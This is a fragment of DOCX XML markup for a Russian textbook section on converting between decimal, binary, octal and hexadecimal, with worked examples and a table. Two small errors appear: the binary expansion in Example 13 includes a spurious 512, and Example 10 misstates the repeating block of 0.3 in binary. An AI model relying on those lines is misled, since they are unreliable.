        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Делим исходное число на основание системы *b*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Записываем остаток от деления (это будет младшая цифра результата)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Частное от деления становится новым числом для деления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Повторяем шаги 1-3, пока частное не станет равным нулю</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Записываем остатки в обратном порядке (от последнего к первому)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры перевода из десятичной системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 5</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 25₁₀ в двоичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>25 : 2 = 12  остаток 1  ← младшая цифра (справа)</w:t>
        <w:br/>
        <w:t>12 : 2 = 6   остаток 0</w:t>
        <w:br/>
        <w:t>6  : 2 = 3   остаток 0</w:t>
        <w:br/>
        <w:t>3  : 2 = 1   остаток 1</w:t>
        <w:br/>
        <w:t>1  : 2 = 0   остаток 1  ← старшая цифра (слева)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Читаем остатки снизу вверх: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>11001₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 1×16 + 1×8 + 0×4 + 0×2 + 1×1 = 16 + 8 + 1 = 25₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 6</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 167₁₀ в восьмеричную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>167 : 8 = 20  остаток 7  ← младшая цифра</w:t>
        <w:br/>
        <w:t>20  : 8 = 2   остаток 4</w:t>
        <w:br/>
        <w:t>2   : 8 = 0   остаток 2  ← старшая цифра</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Читаем остатки снизу вверх: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>247₈</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 2×64 + 4×8 + 7×1 = 128 + 32 + 7 = 167₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 7</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 255₁₀ в шестнадцатеричную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>255 : 16 = 15  остаток 15 (F₁₆)  ← младшая цифра</w:t>
        <w:br/>
        <w:t>15  : 16 = 0   остаток 15 (F₁₆)  ← старшая цифра</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Читаем остатки снизу вверх: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FF₁₆</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 15×16 + 15×1 = 240 + 15 = 255₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 8</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 1000₁₀ в шестнадцатеричную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1000 : 16 = 62  остаток 8   ← младшая цифра</w:t>
        <w:br/>
        <w:t>62   : 16 = 3   остаток 14 (E₁₆)</w:t>
        <w:br/>
        <w:t>3    : 16 = 0   остаток 3   ← старшая цифра</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Читаем остатки снизу вверх: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3E8₁₆</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 3×256 + 14×16 + 8×1 = 768 + 224 + 8 = 1000₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод дробных чисел методом последовательного умножения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для перевода дробной части десятичного числа в систему с основанием *b* используется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>метод последовательного умножения на основание</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Умножаем дробную часть на основание системы *b*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Целая часть произведения — очередная цифра результата</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Дробную часть произведения снова умножаем на основание</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Повторяем шаги 1-3, пока дробная часть не станет равной нулю (или достигнем нужной точности)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Записываем целые части по порядку (слева направо)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 9</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 0,625₁₀ в двоичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0,625 × 2 = 1,25   целая часть: 1  ← первая цифра после запятой</w:t>
        <w:br/>
        <w:t>0,25  × 2 = 0,5    целая часть: 0</w:t>
        <w:br/>
        <w:t>0,5   × 2 = 1,0    целая часть: 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Читаем целые части сверху вниз: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>0,101₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 1×2⁻¹ + 0×2⁻² + 1×2⁻³ = 0,5 + 0 + 0,125 = 0,625₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 10</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 0,3₁₀ в двоичную систему (ограничимся 8 цифрами)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0,3   × 2 = 0,6    целая часть: 0</w:t>
        <w:br/>
        <w:t>0,6   × 2 = 1,2    целая часть: 1</w:t>
        <w:br/>
        <w:t>0,2   × 2 = 0,4    целая часть: 0</w:t>
        <w:br/>
        <w:t>0,4   × 2 = 0,8    целая часть: 0</w:t>
        <w:br/>
        <w:t>0,8   × 2 = 1,6    целая часть: 1</w:t>
        <w:br/>
        <w:t>0,6   × 2 = 1,2    целая часть: 1</w:t>
        <w:br/>
        <w:t>0,2   × 2 = 0,4    целая часть: 0</w:t>
        <w:br/>
        <w:t>0,4   × 2 = 0,8    целая часть: 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Результат: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>0,01001100...₂</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (периодическая дробь)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Видим, что последовательность (0100) повторяется. Это показывает, что не все десятичные дроби имеют конечное представление в двоичной системе (и наоборот). Это важно помнить при работе с вещественными числами в программировании (см. главу 1.9).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Прямой перевод между двоичной, восьмеричной и шестнадцатеричной системами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Благодаря тому, что 8 = 2³ и 16 = 2⁴, существует простой способ перевода между этими системами </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>без промежуточного перевода в десятичную систему</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод из двоичной в восьмеричную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Разбить двоичное число на группы по 3 цифры (триады), начиная справа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если слева не хватает цифр — дополнить нулями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Каждую триаду заменить соответствующей восьмеричной цифрой</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 11</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 11010110₂ в восьмеричную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>11010110₂ → разбиваем на триады: 011 010 110</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                   ↓   ↓   ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                   3   2   6</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: 326₈</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>11010110₂ = 128+64+16+4+2 = 214₁₀</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>326₈ = 3×64 + 2×8 + 6×1 = 192 + 16 + 6 = 214₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод из восьмеричной в двоичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм</w:t>
      </w:r>
      <w:r>
        <w:t>: Каждую восьмеричную цифру заменить соответствующей триадой двоичных цифр.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 12</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 752₈ в двоичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>7    5    2</w:t>
        <w:br/>
        <w:t>↓    ↓    ↓</w:t>
        <w:br/>
        <w:t>111  101  010</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: 111101010₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>752₈ = 7×64 + 5×8 + 2×1 = 448 + 40 + 2 = 490₁₀</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>111101010₂ = 256+128+64+32+8+2 = 490₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод из двоичной в шестнадцатеричную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Разбить двоичное число на группы по 4 цифры (тетрады), начиная справа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если слева не хватает цифр — дополнить нулями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Каждую тетраду заменить соответствующей шестнадцатеричной цифрой</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 13</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 10111101011₂ в шестнадцатеричную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>10111101011₂ → разбиваем на тетрады: 0101 1110 1011</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                       ↓    ↓    ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                       5    E    B</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: 5EB₁₆</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>10111101011₂ = 1024+512+256+128+64+32+8+2+1 = 1515₁₀</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5EB₁₆ = 5×256 + 14×16 + 11×1 = 1280 + 224 + 11 = 1515₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод из шестнадцатеричной в двоичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм</w:t>
      </w:r>
      <w:r>
        <w:t>: Каждую шестнадцатеричную цифру заменить соответствующей тетрадой двоичных цифр.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 14</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести A7F₁₆ в двоичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A      7      F</w:t>
        <w:br/>
        <w:t>↓      ↓      ↓</w:t>
        <w:br/>
        <w:t>1010   0111   1111</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: 101001111111₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A7F₁₆ = 10×256 + 7×16 + 15×1 = 2560 + 112 + 15 = 2687₁₀</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>101001111111₂ = 2048+512+64+32+16+8+4+2+1 = 2687₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод между восьмеричной и шестнадцатеричной системами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для перевода между восьмеричной и шестнадцатеричной системами проще всего использовать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>двоичную систему как посредник</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Восьмеричная → Двоичная → Шестнадцатеричная</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 15</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 177₈ в шестнадцатеричную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шаг 1: 177₈ → двоичная</w:t>
        <w:br/>
        <w:t>1    7    7</w:t>
        <w:br/>
        <w:t>↓    ↓    ↓</w:t>
        <w:br/>
        <w:t>001  111  111</w:t>
        <w:br/>
        <w:br/>
        <w:t>Получили: 001111111₂</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 2: 001111111₂ → шестнадцатеричная</w:t>
        <w:br/>
        <w:t>0111  1111</w:t>
        <w:br/>
        <w:t>↓     ↓</w:t>
        <w:br/>
        <w:t>7     F</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: 7F₁₆</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 177₈ = 127₁₀ = 7F₁₆ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Таблица соответствий систем счисления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для удобства приведём таблицу первых 16 чисел в различных системах счисления:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Десятичная | Двоичная | Восьмеричная | Шестнадцатеричная |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|----------|--------------|-------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0          | 0000     | 0            | 0                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1          | 0001     | 1            | 1                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2          | 0010     | 2            | 2                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3          | 0011     | 3            | 3                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 4          | 0100     | 4            | 4                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 5          | 0101     | 5            | 5                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 6          | 0110     | 6            | 6                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 7          | 0111     | 7            | 7                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 8          | 1000     | 10           | 8                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 9          | 1001     | 11           | 9                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 10         | 1010     | 12           | A                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 11         | 1011     | 13           | B                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 12         | 1100     | 14           | C                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 13         | 1101     | 15           | D                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 14         | 1110     | 16           | E                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 15         | 1111     | 17           | F                 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практическое применение систем счисления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Двоичная система</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Представление данных в ЭВМ**: Вся информация в компьютере хранится и обрабатывается в двоичном виде</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Логические операции**: Двоичные значения 0 и 1 соответствуют логическим ЛОЖЬ и ИСТИНА (см. главу 1.6)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Побитовые операции**: Маски, сдвиги, проверка флагов в программировании</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевые маски**: IP-адреса и маски подсети оперируют двоичными значениями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Восьмеричная система</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**UNIX/Linux права доступа**: Команда `chmod 755 file.txt` использует восьмеричную запись</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>7 (rwx) = 111₂ — владелец: чтение, запись, выполнение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5 (r-x) = 101₂ — группа: чтение, выполнение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5 (r-x) = 101₂ — остальные: чтение, выполнение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Escape-последовательности**: В языках программирования (C, Python) можно записывать символы в восьмеричной форме: `\101` = 'A'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шестнадцатеричная система</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Адреса памяти**: Отладчики (debuggers) показывают адреса в шестнадцатеричном виде</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   0x7FFF5FBFF8A0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Цветовые коды в веб-дизайне**: RGB-цвета записываются в формате #RRGGBB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   #FF5733 = RGB(255, 87, 51)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**MAC-адреса**: Физические адреса сетевых устройств</w:t>
